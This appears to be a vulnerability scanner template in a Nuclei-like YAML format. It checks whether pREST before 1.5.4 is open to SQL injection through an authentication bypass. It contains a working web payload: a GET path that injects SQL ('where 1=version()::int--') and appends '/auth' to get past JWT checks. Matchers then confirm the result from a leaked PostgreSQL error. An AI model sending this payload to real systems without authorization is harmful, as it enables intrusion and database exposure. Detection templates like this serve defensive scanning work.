id: prest-sqli-auth-bypass
brief:
    title: pREST < 1.5.4 - SQL Injection Via Authentication Bypass
    by: mihail8531
    level: critical
    about: An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQ...
    label:
        - sqli
        - prest
        - auth-bypass
        - sqli
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/{{database}}/information_schema".tables)s%20where%201=version()::int--/auth'
      signs:
        - "on": word
          has:
            - 'pq: invalid input syntax for type integer: \"PostgreSQL '
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: content_type
          need: all
